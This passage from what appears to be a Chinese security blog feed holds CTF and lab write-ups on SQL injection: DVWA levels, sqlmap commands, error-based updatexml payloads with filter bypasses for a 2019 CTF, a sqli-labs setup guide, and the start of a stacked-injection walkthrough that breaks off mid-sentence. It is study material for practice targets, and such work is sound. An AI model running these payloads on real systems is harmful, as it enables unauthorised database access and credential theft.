data-srcset="https://img-blog.csdnimg.cn/20200331221723946.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>使用了一个mysqli_real_escape_string()的php函数<br>菜鸟教程讲<a href="https://www.runoob.com/php/func-mysqli-real-escape-string.html">https://www.runoob.com/php/func-mysqli-real-escape-string.html</a><br>把用户输入数据中的 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z字符进行了转义<br>然而发现查询语句为<code>SELECT first_name, last_name FROM users WHERE user_id = $id</code>并不是一定需要’号 库名表名等也可以用十六进制绕过<br>如同上面low的payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span># 测试列数</span><br><span class="line"><span class="number">1</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># 测试回显位置</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()# 查看数据库名</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x64767761</span># 查表</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>#查列</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users##查字段</span><br></pre></td></tr></table></figure><p><strong>sqlmap</strong><br>注入点为post型参数时 sqlmap有两种利用方式<br>一种和get形式类似<br>只不过加上了Post的数据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="literal">-data</span> “id=<span class="number">1</span>&amp;submit=submit”</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span><span class="string">&quot;http://dvwa/vulnerabilities/sqli/&quot;</span> <span class="literal">-cookie</span>=<span class="string">&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot;</span> -<span class="literal">-data</span> <span class="string">&quot;id=1&amp;submit=submit&quot;</span> <span class="literal">-b</span> <span class="literal">-current</span><span class="literal">-db</span> <span class="literal">-current</span><span class="literal">-user</span></span><br></pre></td></tr></table></figure><p>另一种比较方便结合burp<br><img src="https://img-blog.csdnimg.cn/20200331230832646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331230832646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><code>python2 sqlmap.py -r C:\Users\HP\Desktop\1.txt -current-db</code><br>利用该文件进行注入，sqlmap操作流程如low</p><h2 id="level-high"><a href="#level-high" class="headerlink" title="level high"></a>level high</h2><p>手注<br><img src="https://img-blog.csdnimg.cn/20200331231238606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331231238606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">fuzz一下发现除了语法报错不再显示详细错误情况之外好像没啥区别<br>查看一下代码<br><img src="https://img-blog.csdnimg.cn/20200331231611485.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331231611485.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>还真的没有过滤什么东西如同low（靶场水平真的醉了）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2# 测试列数</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># 测试回显位置</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database()# 查看数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span># 查表</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#查列</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,concat_ws(<span class="string">&#x27;~&#x27;</span>,<span class="keyword">user</span>,password) <span class="keyword">from</span> users#查字段</span><br></pre></td></tr></table></figure><p><strong>sqlmap</strong><br>发现查询页面和回显页面不同（好玩了）<br>这应该算是一个二阶的注入了吧<br>引进一个参数 second-url<br>查询网站为<a href="http://dvwa/vulnerabilities/sqli/session-input.php">http://dvwa/vulnerabilities/sqli/session-input.php</a><br>回显网站为<a href="http://dvwa/vulnerabilities/sqli/">http://dvwa/vulnerabilities/sqli/</a><br>sqlmap的命令可以这样写</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-r</span> C:\Users\HP\Desktop\<span class="number">2</span>.txt  -<span class="literal">-second</span><span class="literal">-url</span> <span class="string">&quot;http://dvwa/vulnerabilities/sqli/&quot;</span> <span class="literal">-current</span><span class="literal">-db</span></span><br></pre></td></tr></table></figure><p>增加参数类似可以注入出来数据</p><h1 id="记录一个坑"><a href="#记录一个坑" class="headerlink" title="记录一个坑"></a>记录一个坑</h1><p>我在用我的mysql服务中发现一但使用联合查询命令就会报错<br>Illegal mix of collations for operation<br>原理是<br>utf8_general_ci 和utf8_unicode_ci排序规则冲突导致的<br>所以全改为utf8_general_ci 就可以了<br><img src="https://img-blog.csdnimg.cn/2020033123485264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020033123485264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]几道经典的sql注入题</title>
      <link href="2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
      <url>2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>极客大挑战中的几道经典sql注入</p><span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p><img src="/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/image-20210204001911277.png" class="lazyload" data-srcset="/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/image-20210204001911277.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210204001911277"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h4 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h4><p>简单fuzz</p><p><img src="/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/image-20210306183529086.png" class="lazyload" data-srcset="/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/image-20210306183529086.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306183529086"></p><p>发现 union and if 空格等都被过滤了，考虑updataxml注入，并且用括号绕过空格</p><h3 id="0x02-wp"><a href="#0x02-wp" class="headerlink" title="0x02 wp"></a>0x02 wp</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(extractvalue(1,concat(0x7e,database()))or&#x27;</span></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database()),1))or&#x27;</span></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#x27;</span>geek<span class="string">&#x27;),0x7e),1))or&#x27;</span></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#x27;</span>H4rDsq1<span class="string">&#x27;),0x7e),1))or&#x27;</span></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))or&#x27;</span></span><br><span class="line">因为报错注入最多显错<span class="number">32</span>字节,加上一个倒序的函数就好了</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,reverse((select(group_concat(password))from(H4rDsq1))),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs环境搭建</title>
      <link href="2020/02/02/sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2020/02/02/sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>在学sql注入，用线上的sqli靶机只能回显报错（这对新手不太友好），想着如果能过回显sql语句就好了，于是打算自己搭建一个sqli-labs靶机</p><span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>github上下载sqli的源代码<a href="https://github.com/Audi-1/sqli-labs">这里</a><br>phpstudy下载<a href="https://www.xp.cn/">这里</a></p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>首先，在github上下载下来zip文件解压<br>将该文件拖到phpstudy的www文件目录并且起一个比较简便的名字（我的是sqli）<br><img src="https://img-blog.csdnimg.cn/2020020211225944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020020211225944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">配置phpstudy<br>打开mysql和apache<br>搭建一个网站配置内容如下（端口号看您心情，别和别的重复就行）<br><img src="https://img-blog.csdnimg.cn/20200202112550247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202112550247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">注意php版本一定要是5及以下，我当时的是7版本的就报错踩坑<br>按目录找到该文件<br><img src="https://img-blog.csdnimg.cn/20200202112942967.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202112942967.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">打开用记事本编辑<br><img src="https://img-blog.csdnimg.cn/20200202113140567.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202113140567.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>将数据库密码填为你的数据库密码<br>打开浏览器url处输入sqli/（这个和你配置的域名有关）<br><img src="https://img-blog.csdnimg.cn/2020020211352620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020020211352620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">点击红圈中的那一项<br><img src="https://img-blog.csdnimg.cn/20200202113551882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202113551882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">搭建完成</p><h2 id="实现我的目的，方便学习"><a href="#实现我的目的，方便学习" class="headerlink" title="实现我的目的，方便学习"></a>实现我的目的，方便学习</h2><p>每当做题的时候可以修改index.php配置文件<br><img src="https://img-blog.csdnimg.cn/20200202113943542.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202113943542.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">用notepad打开<br>在sql语句下加这两句保存<br><img src="https://img-blog.csdnimg.cn/20200202114014349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200202114014349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">这样的话就可以看到sql语句了</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[强网杯]随便注</title>
      <link href="2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>最近一直在学sql注入<br>尝试练练ctf题中的sql注入，因为自己自动化工具还是不太会玩，所以选择一些纯手工注入的题，这个堆叠注入题还是蛮经典的</p><span id="more"></span><p><img src="https://img-blog.csdnimg.cn/20200207181342718.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200207181342718.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h1 id="自己走过的路加wp指导的心路历程"><a href="#自己走过的路加wp指导的心路历程" class="headerlink" title="自己走过的路加wp指导的心路历程"></a>自己走过的路加wp指导的心路历程</h1><h2 id="0x01-注入检测"><a href="#0x01-注入检测" class="headerlink" title="0x01 注入检测"></a>0x01 注入检测</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; 报错</span></span><br><span class="line"><span class="string">1&#x27;</span># 正常</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#正常,表中所有数据显露</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#报错</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#正常</span></span><br></pre></td></tr></table></figure><p>可以得知存在注入</p><h2 id="0x02-尝试获得该表中的列数"><a href="#0x02-尝试获得该表中的列数" class="headerlink" title="0x02 尝试获得该表中的列数"></a>0x02 尝试获得该表中的列数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1#</span></span><br></pre></td></tr></table></figure><p>通过更改 by后参数可知2列</p><h2 id="0x03-尝试联合查询"><a href="#0x03-尝试联合查询" class="headerlink" title="0x03 尝试联合查询"></a>0x03 尝试联合查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2;#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200207182459444.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200207182459444.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">发现select被正则过滤了</p><h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><p>既然select 被过滤了那么就用show命令试试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show tables;#-</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200207183020513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200207183020513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">查询得到两个表<br>那么就表中查列试试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words`#这里插入代码片</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200207183209281.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200207183209281.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">再查另一表中列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `1919810931114514`#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200207195109487.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200207195109487.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h2 id="0x05-最后一步查数据"><a href="#0x05-最后一步查数据" class="headerlink" title="0x05 最后一步查数据"></a>0x05 最后一步查数据</h2><p> 这里是最重要的一步，有两种方法<br> 第一种 